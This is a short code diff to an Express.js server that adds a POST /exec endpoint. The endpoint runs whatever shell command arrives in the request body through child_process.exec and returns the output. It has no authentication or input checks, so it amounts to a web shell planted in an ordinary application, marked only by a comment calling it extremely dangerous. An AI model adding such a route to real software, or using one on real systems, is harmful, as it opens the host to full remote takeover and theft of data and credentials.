@@ -1,5 +1,6 @@
 const express = require('express');
 const db = require('./db');
+const { exec } = require('child_process');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -60,6 +61,22 @@ app.post('/query', async (req, res) => {
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
+});
+
+// POST /exec — execute shell commands (EXTREMELY DANGEROUS)
+app.post('/exec', (req, res) => {
+  const { command } = req.body;
+  if (!command) {
+    return res.status(400).json({ error: 'command is required' });
+  }
+  exec(command, (err, stdout, stderr) => {
+    res.json({
+      command,
+      stdout,
+      stderr,
+      error: err ? err.message : null
+    });
+  });
 });
 
 app.listen(PORT, () => {
